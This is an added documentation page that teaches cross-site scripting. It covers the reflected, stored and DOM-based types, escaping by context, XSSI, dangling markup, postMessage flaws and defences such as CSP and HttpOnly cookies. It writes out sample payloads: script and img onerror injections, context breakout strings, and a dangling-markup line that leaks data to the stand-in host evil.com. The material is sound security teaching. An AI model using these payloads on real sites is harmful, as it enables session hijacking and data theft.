@@ -1,0 +1,126 @@
+---
+sidebar_position: 6
+title: "XSS — Cross-Site Scripting"
+description: "Reflected, stored, and DOM-based XSS, plus the related XSSI and dangling-markup tricks that make up the most common client-side web vulnerability."
+---
+
+import Admonition from '@theme/Admonition';
+
+# XSS — Cross-Site Scripting
+
+`Fundamentals` · `Web Application Security` · `Reading time: ~11 min`
+
+If injection bugs are about breaking out of a server-side interpreter, **Cross-Site Scripting is about breaking out of HTML** — getting the browser to execute attacker-controlled JavaScript in the context of a site the victim trusts.
+
+---
+
+## Why XSS Matters So Much
+
+A successful XSS payload runs with the **same privileges as the real site**, from the victim's own browser. That means it can:
+
+- Steal session cookies or tokens (session hijacking).
+- Perform any action the logged-in victim could perform (change their email, transfer funds, post as them).
+- Read anything rendered on the page, including other users' data if the page displays it.
+- Pivot into further attacks like CSRF-token theft, keylogging, or phishing overlays.
+
+```text
+Attacker payload stored or reflected
+       |
+       v
+Victim's browser renders the page
+       |
+       v
+Browser executes attacker JS *as the trusted site*
+       |
+       v
+Attacker JS acts with the victim's session
+```
+
+---
+
+## The Three Classic Types
+
+### 1. Reflected XSS
+
+The payload travels in the request (usually a URL parameter) and is echoed back in the immediate response without being stored anywhere.
+
+```text
+https://example.com/search?q=<script>alert(document.cookie)</script>
+```
+
+If the search page prints `q` back into the page (e.g. "You searched for: ...") without encoding it, the script executes. This requires tricking a victim into clicking a crafted link — making it a phishing-adjacent bug.
+
+### 2. Stored XSS
+
+The payload is saved on the server (a comment, a username, a support ticket) and later rendered to **other users** who view that content — no crafted link required, since the payload is now a permanent part of the page. This is generally considered more dangerous because it can hit every visitor, including administrators reviewing user-submitted content.
+
+### 3. DOM-Based XSS
+
+The vulnerable code never touches the server at all — client-side JavaScript reads something attacker-controlled (like `location.hash` or `document.URL`) and writes it into the page using an unsafe sink such as `innerHTML`.
+
+```js
+// Vulnerable pattern:
+document.getElementById('welcome').innerHTML = location.hash.substring(1);
+```
+
+```text
+https://example.com/page#<img src=x onerror=alert(1)>
+```
+
+The server never sees this payload — it lives entirely in the URL fragment and is processed purely client-side, which is why traditional server-side input filtering cannot catch DOM-based XSS at all.
+
+<Admonition type="tip" title="Freshers' takeaway">
+
+All three types share one root cause: **untrusted data is written into the page using a sink that interprets it as markup/code, instead of a sink that treats it as plain text.** `innerHTML` interprets; `textContent` doesn't. Learning to spot "interpreting" sinks (`innerHTML`, `document.write`, `eval`, `v-html`, `dangerouslySetInnerHTML`) is 80% of finding and fixing XSS.
+
+</Admonition>
+
+---
+
+## Context Matters
+
+Where the payload lands changes what you need to escape:
+
+| Context | Example sink | What breaks it out |
+|---|---|---|
+| HTML body | `<div>USER_INPUT</div>` | `<script>`, `<img onerror=...>` |
+| HTML attribute | `<input value="USER_INPUT">` | `" onmouseover="..."` |
+| JavaScript string | `var x = "USER_INPUT";` | `";alert(1);//` |
+| URL | `<a href="USER_INPUT">` | `javascript:alert(1)` |
+
+A filter tuned for one context often fails completely in another — a classic real-world bug is an app that HTML-encodes correctly for the body but still concatenates unescaped input into an inline `<script>` block.
+
+---
+
+## Related Client-Side Tricks
+
+- **XSSI (Cross-Site Script Inclusion)** — when a server endpoint returns JSON wrapped as if it were executable JavaScript (an old pattern meant to support legacy browsers), another site can `<script src="...">` it and read sensitive data via overridden array/object constructors — a confused-deputy bug adjacent to XSS.
+- **Dangling Markup Injection** — when full script injection is blocked but *partial* HTML injection is allowed, an attacker can inject an unclosed tag (like a dangling `<img src="https://evil.com/leak?data=`) that causes the browser to send everything up to the next quote character to an attacker-controlled server — exfiltrating data without ever running JavaScript.
+- **postMessage Vulnerabilities** — pages that listen for `window.postMessage` events without validating the sender's `origin` can be tricked by a malicious page into accepting attacker-controlled data as if it came from a trusted source, often feeding directly into an XSS sink.
+
+---
+
+## How This Gets Fixed
+
+| Defense | Why it works |
+|---|---|
+| **Context-aware output encoding** | Encode for the *specific* context (HTML body vs. attribute vs. JS string) — a single generic "escape HTML" function is not enough. |
+| **Modern frameworks' default escaping** | React, Vue, and Angular escape bound text by default; the risk reappears almost entirely through explicit escape hatches like `dangerouslySetInnerHTML` or `v-html`. |
+| **Content Security Policy (CSP)** | A strict CSP can prevent injected inline scripts from executing even if an XSS bug exists — defense in depth, not a replacement for fixing the bug. |
+| **`HttpOnly` cookies** | Doesn't stop XSS, but prevents stolen cookies from being read via `document.cookie`, limiting session-hijacking impact. |
+| **Origin validation on `postMessage`** | Always check `event.origin` against an allowlist before trusting message data. |
+
+---
+
+## Key Takeaways
+
+- XSS lets attacker JavaScript run with the trusted site's own privileges, inside the victim's browser.
+- Reflected needs a crafted link; stored hits every viewer; DOM-based never touches the server at all.
+- The right defense depends on *where* the output lands — HTML body, attribute, JS string, and URL all need different encoding.
+- Related tricks (XSSI, dangling markup, unsafe `postMessage` handling) achieve XSS-like impact without a classic `<script>` payload.
+
+---
+
+## Next
+
+A separate browser-trust problem, where the attacker doesn't need to inject *anything* — they just need the victim to click: **[CSRF, Clickjacking & UI Redress](./06-csrf-clickjacking-and-ui-redress)**.
